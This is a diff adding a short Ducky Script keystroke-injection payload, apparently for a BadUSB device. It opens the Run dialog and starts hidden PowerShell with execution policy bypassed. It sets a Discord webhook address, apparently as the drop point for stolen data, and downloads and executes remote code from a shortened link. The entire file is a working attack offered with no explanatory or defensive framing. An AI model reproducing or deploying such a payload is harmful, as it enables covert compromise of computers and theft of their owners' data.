@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1179836878531350578/3-z0LfxJ5eBVOIgzKTrWqvw9HO0PynI6iOAPlT1QJb6fmbssX0rmTOSlZh2NySJY_h_8';$db='';irm bit.ly/3takj5v | iex
+ENTER
